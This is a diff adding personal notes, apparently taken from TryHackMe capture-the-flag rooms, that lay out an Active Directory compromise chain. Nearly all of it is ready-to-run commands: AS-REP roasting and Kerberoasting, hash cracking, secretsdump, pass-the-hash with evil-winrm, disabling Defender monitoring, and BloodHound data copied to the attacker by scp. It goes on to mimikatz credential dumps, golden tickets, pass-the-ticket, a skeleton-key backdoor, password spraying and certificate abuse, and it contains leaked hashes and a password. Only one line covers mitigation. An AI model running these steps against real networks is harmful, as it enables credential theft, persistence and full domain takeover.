@@ -1,0 +1,256 @@
+
+Nmap -sc ip
+enum4linux
+python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.10.139.203 -no-pass
+kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
+
+
+john svc-admin.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+hashcat -m 18200 -a 0 svc-admin.hash /usr/share/wordlists/rockyou.txt --show
+
+smbclient -L 10.10.139.203 -U svc-admin
+smbclient  \\\\10.10.139.203\\backup -U svc-admin
+crack  the pasword ifyou found
+now use secretsdump from impacket.
+
+
+python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.139.203   
+evil-winrm -i 10.10.139.203 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc 
+
+or
+
+psexec.py -hashes inserthashes administrator@spookysec.local
+
+PowerView.ps1
+if powerview detected the try
+Set-MpPreference -DisableRealtimeMonitoring $true
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+Get-NetUser | select cn
+Get-NetGroup -GroupName *admin*
+. .\Downloads\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
+it will generate loot.zip file then send it to attacker machine using scp.        
+or 
+put SharpHound.ps1
+Import-Module C:\Enterprise-Share\sharphound.ps1
+Invoke-BloodHound -CollectionMethod All
+cp 20211217084021_BloodHound.zip C:\Enterprise-Share\
+
+
+from attacker machine 
+scp Administrator@10.10.43.176:C:/Users/Administrator/20230226205204_loot.zip info.zip
+
+use neo4j and bloodhound to analyze network in graphical mode
+neo4j start
+if error 
+restart neo4j
+and login neo4j Thakur12345prabhash
+start bloodhound  and upload zip file to bloodhound which we have obtained from invoking bloodhound collectionmethod.
+  and now mimikatz
+cd Downloads && mimikatz.exe
+privilege::debug  if ok means you are running as admin.
+ lsadump::lsa /patch
+
+hashcat -m 1000 <hash> rockyou.txt    
+
+
+lsadump::lsa /inject /name:krbtgt
+
+kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:s1-5.......29 /krbtgt:78.....(NTLM ID) /id:500
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 
+ /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+misc::cmd - This will open a new command prompt with elevated privileges to all machines
+dir \\Desktop-1\c$
+psExec.exe \\Desktop-1 cmd.exe
+hostname
+
+
+
+
+Rubeus==>> a tool
+P@$$W0rd
+Rubeus.exe harvest /interval:30
+
+for bruteforce and spray
+echo 10.10.201.180 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+cd Downloads
+Rubeus.exe brute /password:Password1 /noticket
+
+Rubeus.exe kerberoast   ==>>This will dump the Kerberos hash of any kerberoastable users    
+
+hashcat -m 13100 -a 0 hash.txt Pass.txt
+
+Kerberoasting w/ Impacket - 
+
+1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located
+
+2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.201.180 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
+
+3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
+
+Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
+
+2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
+
+Use the same wordlist that you downloaded in task 4
+hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 
+
+
+
+
+1.) cd Downloads - navigate to the directory mimikatz is in
+
+2.) mimikatz.exe - run mimikatz
+
+3.) privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+
+
+
+4.) sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in
+
+
+
+
+Pass the Ticket w/ Mimikatz
+
+Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
+
+1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+
+
+
+2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+
+We will not be using mimikatz for the rest of the attack.
+
+
+
+3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
+
+
+
+
+
+Dump the krbtgt hash -
+
+﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz
+
+2.) privilege::debug - ensure this outputs [privilege '20' ok]
+
+﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
+
+
+
+
+Create a Golden/Silver Ticket - 
+
+﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
+
+I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.
+
+
+
+
+
+
+Use the Golden/Silver Ticket to access other machines -
+
+﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.
+
+
+
+2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
+
+
+
+This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.
+
+
+
+
+
+
+
+
+Preparing Mimikatz - 
+
+1.) cd Downloads && mimikatz.exe - Navigate to the directory mimikatz is in and run mimikatz
+
+2.) privilege::debug - This should be a standard for running mimikatz as mimikatz needs local administrator access
+
+
+
+Installing the Skeleton Key w/ mimikatz -
+
+1.) misc::skeleton - Yes! that's it but don't underestimate this small command it is very powerful
+
+
+
+Accessing the forest - 
+
+The default credentials will be: "mimikatz"
+
+example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password
+
+example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+
+The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
+
+
+Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.
+
+Pass the Ticket Mitigation -
+
+Let's talk blue team and how to mitigate these types of attacks. 
+
+Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
+Answer the questions below
+
+
+
+
+
+
+
+
+./ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
+
+
+
+
+easy steps-1
+
+nmap -sC -sV -Pn -n -A 10.10.250.157
+ldapsearch -x -H ldap://10.10.127.45 -s base namingcontexts
+
+smbclient -L \\\\10.10.250.157
+lookupsid.py anonymous@10.10.250.157
+ grep SidTypeUser user.txt | awk '{print $2}' | cut -d "\\" -f2 > splited_user.txt
+GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.10.250.157
+john  --wordlist=/root/THM/rockyou.txt hashe.txt 
+smbclient  -U t-skid \\\\10.10.250.157\\NETLOGON
+wmiexec.py vulnnet-rst.local/a-whitehat@10.10.116.57
+secretsdump.py vulnnet-rst.local/a-whitehat:******************@10.10.250.157
+evil-winrm -i 10.10.250.157 -u Administrator -H c25[HIDDEN]c3b09d
+
+scp kali@10.11.25.118:/home/kali/Documents/Certify.exe C:/THMTools
+
+
+Make sure to copy the whole body (from BEGIN RSA PRIVATE KEY to END CERTIFICATE). In order to successfully convert it we must have the private key itself.
+save to cert.pem and then convert to .pfx using below command.
+
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+transfer using iwr or scp to victim machine and use command 
+
+Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:ticket /ptt
+Rubeus.exe asktgt /user:Administrator /password:pass /certificate:cert.pfx /outfile:ticket
+ /ptt
+
+
+We are already administrators up to this point, and to test our skillz, 
+we can simply change the Administrator user’s password with:
+Rubeus.exe changepw /new:ChangeMe123 /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\Administrator /ticket:ticket
